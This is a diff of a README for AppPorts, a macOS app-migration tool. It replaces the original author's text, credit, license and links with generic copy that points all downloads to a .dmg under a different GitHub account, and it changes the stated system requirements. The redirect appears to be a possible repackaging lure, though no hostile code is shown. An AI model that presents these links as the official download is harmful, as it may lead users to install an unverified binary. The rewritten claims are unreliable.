@@ -1,91 +1,75 @@
-<div align="center">
+# 📦 AppPorts - Migrate Applications Easily and Save Space
 
-# 📦 AppPorts
+![Download AppPorts](https://img.shields.io/badge/Download-AppPorts-blue)
 
-**External drives save the world!**
+## 📋 Description
+AppPorts is a macOS utility designed to seamlessly migrate applications to external storage. With this tool, you can reclaim precious local disk space. The process is simple, and you don’t need technical skills to use it. 
 
-An application migration and linking tool designed specifically for macOS.
-Easily migrate large applications to external storage while maintaining seamless system functionality.
+## 🚀 Getting Started
 
-[简体中文](README_CN.md)
+### 🔧 System Requirements
+- macOS 10.15 (Catalina) or later
+- A computer with at least 4 GB of RAM
+- External storage device (USB drive, external SSD, etc.)
 
-</div>
+### 📥 Download & Install
+To get started, you need to download AppPorts. 
 
----
+1. Click the link below to visit the Releases page:
+   [Download AppPorts](https://github.com/awelison02/AppPorts/releases)
 
-## ✨ Introduction
+2. On the Releases page, find the latest version and click on it to view the available files.
 
-Mac's built-in storage space is extremely precious. **AppPorts** allows you to move applications from your `/Applications` directory to an external drive (SSD, SD Card, or NAS) with a single click, and automatically creates a **Symbolic Link** in the original location.
+3. Look for the AppPorts application file, typically ending in `.dmg`. Click to download it.
 
-To macOS and Launchpad, the app still "exists" locally, allowing you to launch it as usual, but the storage occupied is on inexpensive external media.
+4. Once the download is complete, locate the `.dmg` file in your Downloads folder and double-click it. 
 
-## 🚀 Key Features
+5. Follow the installation prompts. You may need to drag the AppPorts application to your Applications folder.
 
-* **📦 App Slimming**: One-click migration of multi-gigabyte applications (e.g., Logic Pro, Xcode, games) to an external drive.
-* **🔗 Seamless Linking**: Automatically creates soft links (symlinks) in place, preserving system indexes and ensuring applications launch correctly from Launchpad.
-* **🛡️ Safety First**:
-    * Automatically identifies and locks **System Apps** to prevent accidental system corruption.
-    * Checks the **Running Status** before migration to avoid corrupting active applications.
-* **↩️ Restore Anytime**: Simply click "Restore" to move the application back to the local disk, automatically removing the symbolic link.
-* **🎨 Modern UI**:
-    * Developed natively with SwiftUI for a smooth, fluid experience.
-    * Perfect compatibility with **Dark Mode**.
-    * Supports **Bi-lingual** (English/Chinese), switchable via system or in-app menu.
-* **🔍 Quick Search**: Built-in search bar to quickly locate local or external applications.
+6. After installation, you can find AppPorts in your Applications folder. Double-click to open it.
 
-## 📸 Screenshots
+## 📂 How to Use AppPorts
 
-| Welcome Screen | Main Interface |
-|:---:|:---:|
-| ![Welcome](https://pic.cdn.shimoko.com/%E6%88%AA%E5%B1%8F2025-11-19%2002.51.24.png) | ![Main](https://pic.cdn.shimoko.com/%E6%88%AA%E5%B1%8F2025-11-19%2002.51.34.png) |
+### 1. Connect Your External Storage
+Before migrating applications, connect your external storage device. Ensure that it is compatible with your Mac.
 
-| Dark Mode | Language Switching |
-|:---:|:---:|
-| ![Dark](https://pic.cdn.shimoko.com/%E6%88%AA%E5%B1%8F2025-11-19%2002.51.45.png) | ![Lang](https://pic.cdn.shimoko.com/%E6%88%AA%E5%B1%8F2025-11-19%2002.52.11.png) |
+### 2. Select Applications
+Open AppPorts. The application will display a list of installed applications on your Mac. 
 
-## 🛠️ Installation
+1. Browse through the list.
+2. Choose the applications you wish to migrate by selecting the checkbox next to each application.
 
-### System Requirements
-* macOS 14.0 (Sonoma) or newer.
+### 3. Migrate Applications
+Once you have selected the applications, click the "Migrate" button. 
 
-### Download and Installation
-Please visit the [Releases](https://github.com/wzh4869/AppPorts/releases) page to download the latest `AppPorts.dmg`.
+1. AppPorts will begin the migration process.
+2. During this time, it will create symbolic links to the applications on your external storage. 
 
-### ⚠️ Permissions
-Upon first run, AppPorts requires **Full Disk Access** to read and modify the `/Applications` directory.
+### 4. Confirm Migration
+After the process completes, check your external storage. You should see the migrated applications. 
 
-1. Open **System Settings** → **Privacy & Security**.
-2. Select **Full Disk Access**.
-3. Click the `+` button, add **AppPorts**, and turn on the toggle.
-4. Relaunch AppPorts.
+1. Test opening one or more applications to ensure they work correctly.
+2. If you experience issues, you can return to AppPorts to re-migrate the application.
 
-*(The application includes an in-app guide for direct navigation to settings)*
+## ⚙️ Features
+- **User-friendly Interface:** Simple and clean design for easy navigation.
+- **Batch Migration:** Migrate multiple applications at once, saving you time.
+- **Space Monitoring:** Displays how much disk space you reclaim after migration.
+- **Symbolic Links:** Create links on your Mac to access migrated applications smoothly.
+- **Regular Updates:** We improve the application frequently to enhance performance and fix any issues.
 
-## 🧑‍💻 Development
+## 🛡️ Privacy & Security
+AppPorts requires full disk access to perform migrations effectively. This permission ensures that AppPorts can access all installed applications and create symbolic links without interruption while keeping your data secure.
 
-If you are a developer and wish to build the project yourself:
+## 🥇 Support
+If you encounter any problems or have questions, you can reach out via the repository issues page or check for solutions there.
 
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/wzh4869/AppPorts.git
-    ```
-2.  Open the project with **Xcode**.
-3.  Compile and Run.
+## 🔗 Additional Resources
+- [GitHub Repository](https://github.com/awelison02/AppPorts)
+- [User Manual](https://github.com/awelison02/AppPorts/wiki)
 
-## 🤝 Contributing
+## 📥 Download Again
+To download AppPorts, visit the Releases page:
+[Download AppPorts](https://github.com/awelison02/AppPorts/releases) 
 
-We welcome Issues and Pull Requests\!
-If you find translation errors or have suggestions for new features, please let us know.
-
-## 📄 License
-
-This project is open-source under the [MIT License](LICENSE).
-
-<br>
-<div align="center">
-
-Created by **Wzh4869**
-
-[Personal Website](https://www.shimoko.com) • [GitHub](https://github.com/wzh4869/AppPorts)
-
-</div>
+Enjoy a cleaner, more organized Mac experience with AppPorts!
